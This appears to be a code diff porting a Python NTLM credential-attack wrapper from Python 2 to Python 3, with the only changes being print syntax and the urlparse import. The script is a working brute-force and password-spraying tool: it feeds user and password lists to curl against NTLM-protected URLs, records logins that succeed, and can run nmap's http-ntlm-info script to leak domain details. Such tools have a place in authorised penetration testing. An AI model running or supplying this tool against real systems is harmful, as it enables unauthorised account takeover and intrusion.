@@ -1,11 +1,11 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # Simple wrapper for some command line NTLM attacks
 
 import argparse
 import sys
 import os.path
 import subprocess
-from urlparse import urlparse
+from urllib.parse import urlparse
 import re
 import time
 import signal
@@ -19,7 +19,7 @@ def test_login( username, password, url, http1_1 = False ):
   if username in foundusers:
     return False
 
-  print "[*] Testing " + username + " : " + password 
+  print("[*] Testing " + username + " : " + password) 
   # cmd = "curl -s -I --ntlm --user " + username + ":" + password + " -k " + url
   try:
     cmd = ["curl", "-s", "-I", "--ntlm", "--user", username + ":" + password, "-k"] 
@@ -31,7 +31,7 @@ def test_login( username, password, url, http1_1 = False ):
     m = re.findall( "HTTP\/\d.\d (\d{3})", out )
     for code in m:
       if code != "401":
-        print "[+] FOUND: " + username + " : " + password
+        print("[+] FOUND: " + username + " : " + password)
         found.append( username + " : " + password )
         foundusers.append( username )
         if args.quitonsuccess:
@@ -45,15 +45,15 @@ def test_login( username, password, url, http1_1 = False ):
   except SystemExit:
     raise
   except:
-    print 'ERROR: curl call failed'
+    print('ERROR: curl call failed')
   return False
 
 def show_found():
-  if len( found ) > 0: print "Found:\n - " + "\n - ".join(found)
-  else: print "No creds found :(" 
+  if len( found ) > 0: print("Found:\n - " + "\n - ".join(found))
+  else: print("No creds found :(") 
 
 def cancel_handler(signal=None,frame=None):
-  print "Caught ctrl-c, quitting..."
+  print("Caught ctrl-c, quitting...")
   show_found()
   sys.exit(0)
 
@@ -79,7 +79,7 @@ if not args.url:
   parser.print_usage()
   sys.exit(2)
 
-print 
+print() 
 
 if args.delay:
   args.delay = int(args.delay)
@@ -96,36 +96,36 @@ else:
 found = []
 foundusers = []
 
-print 'Running against ' + url.geturl()
+print('Running against ' + url.geturl())
 
 if args.info:
   # Run NTLM info leak
   cmd = "nmap -p" + str(port) + " --script http-ntlm-info --script-args http-ntlm-info.root="+url.path+" "+url.netloc
-  print cmd
+  print(cmd)
   os.system( cmd )
 
 if (( args.user or args.userlist ) and ( args.password or args.passlist )) or args.credslist:
   
   # Check user
   if args.userlist and not os.path.isfile(args.userlist):
-    print 'Couldn\'t find ' + args.userlist
+    print('Couldn\'t find ' + args.userlist)
     parser.print_usage()
     sys.exit(2)
 
   # Check password
   if args.passlist and not os.path.isfile(args.passlist):
-    print 'Couldn\'t find ' + args.passlist
+    print('Couldn\'t find ' + args.passlist)
     parser.print_usage()
     sys.exit(2)
   
   # Check user
   if args.credslist and not os.path.isfile(args.credslist):
-    print 'Couldn\'t find ' + args.credslist
+    print('Couldn\'t find ' + args.credslist)
     parser.print_usage()
     sys.exit(2)
   
   if args.passlist:
-    print "Password list"
+    print("Password list")
     fp = open( args.passlist, "r" )
     
     if args.user:
@@ -155,7 +155,7 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
         test_login( args.user, p, url.geturl(), args.http1_1 )
     fp.close()
   elif args.userlist:
-    print "User list"
+    print("User list")
     fu = open( args.userlist, "r" )
     for u in fu:
       # Many users, one password
@@ -166,7 +166,7 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
         test_login( u, '', url.geturl(), args.http1_1 )
     fu.close()
   elif args.credslist:
-    print 'Creds list'
+    print('Creds list')
     fp = open( args.credslist, "r" )
     for line in fp:
       line = line.strip()
@@ -174,12 +174,12 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
         continue
       creds = line.split(':')
       if len( creds ) < 2:
-        print 'No username / pass combination in: ' + line
+        print('No username / pass combination in: ' + line)
         continue
       test_login(creds[0], ':'.join(creds[1:]), url.geturl(), args.http1_1) 
   else:
     # One user, one password
-    print "Single user / password" 
+    print("Single user / password") 
     if args.blank:
       test_login( args.user, '', url.geturl(), args.http1_1 )
     if args.same:
@@ -188,4 +188,4 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
  
   show_found()
 
-print "Done"
+print("Done")
